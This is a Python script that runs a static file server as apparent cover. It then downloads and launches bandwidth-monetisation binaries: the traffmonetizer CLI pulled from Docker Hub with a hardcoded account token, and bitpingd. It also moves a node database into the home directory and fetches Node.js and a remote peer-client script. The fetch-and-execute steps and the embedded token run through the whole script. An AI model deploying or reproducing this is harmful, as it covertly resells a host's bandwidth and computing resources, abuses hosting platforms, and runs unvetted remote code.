import asyncio, aiohttp.web, pathlib, uvloop, os, posixpath, tarfile, io, shutil, builtins

async def main():
    app = aiohttp.web.Application()
    app.add_routes([aiohttp.web.static('/', pathlib.Path(__file__).resolve().parent, show_index=True)])
    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    site = aiohttp.web.TCPSite(runner, port=os.getenv('PORT'))
    await site.start()
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout()) as client:
        async with client.get(f'https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull') as response:
            token = (await response.json()).get('token')
            async with client.get(f'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/manifests/sha256:6dbf8e75cc93e25131e2e701b1d478b3ccbf89212636b08d629621c270f0c966', headers={'authorization':'Bearer ' + token, 'accept':'application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json'}) as manifests:
                async with client.get(posixpath.join('https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs', (await manifests.json()).get('layers')[0].get('digest')), headers={'authorization':'Bearer ' + token}) as response:
                    tar = tarfile.open(mode='r:gz', fileobj=io.BytesIO(await response.content.read()))
                    member = tar.getmember('usr/local/bin/cli')
                    member.name = pathlib.Path(member.name).name
                    tar.extract(member, path=pathlib.Path(__file__).resolve().parent)
        await asyncio.create_subprocess_exec(pathlib.Path(__file__).resolve().parent.joinpath('cli'), 'start', 'accept', '--token', 'ELGPy/DEQYDtARslA6HnkrbPIF6JQi+qYLCre5LBe58=')
        bitpingd = pathlib.Path.home().joinpath('.bitpingd')
        bitpingd.mkdir(parents=True, exist_ok=True)
        shutil.move('/app/node.db', bitpingd)
        async with client.get('https://releases.bitping.com/bitpingd/update.json') as releases:
             async with client.get((await releases.json()).get('platforms').get('linux-x86_64').get('url')) as response:
                    tar = tarfile.open(mode='r:gz', fileobj=io.BytesIO(await response.content.read()))
                    tar.extract('bitpingd', path=pathlib.Path(__file__).resolve().parent)
        await asyncio.create_subprocess_exec(pathlib.Path(__file__).resolve().parent.joinpath('bitpingd'))
        async with client.get('https://nodejs.org/dist/v24.21.0/node-v24.21.0-linux-x64.tar.xz') as node:
            tar = tarfile.open(mode='r:xz', fileobj=io.BytesIO(await node.content.read())) 
            for _ in tar.getmembers(): _.name = builtins.str(pathlib.Path('node', *pathlib.Path(_.name).parts[1:]))
            tar.extractall(path=pathlib.Path(__file__).resolve().parent)
        async with client.get('https://app-updates.sock.sh/peerclient/script/script.js') as script: pathlib.Path(__file__).resolve().parent.joinpath('script.js').write_bytes(await script.content.read())
    await asyncio.Future()
    
uvloop.run(main())
